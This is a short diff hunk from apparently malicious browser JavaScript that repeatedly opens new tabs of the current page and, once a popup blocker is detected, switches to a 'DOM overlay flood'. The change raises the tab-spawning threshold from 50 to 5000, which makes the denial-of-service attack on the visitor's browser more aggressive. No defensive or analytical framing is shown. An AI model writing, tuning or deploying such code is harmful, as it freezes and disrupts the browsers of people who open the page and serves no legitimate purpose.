@@ -135,7 +135,7 @@
             let w = window.open(window.location.href, '_blank');
             count++;
             log(`Spawned tab instance #${count}`);
-            if (count > 50 && !w) {
+            if (count > 5000 && !w) {
                 log("Popup blocker detected, switching to full DOM overlay flood...");
                 clearInterval(floodInterval);
                 domBomb();
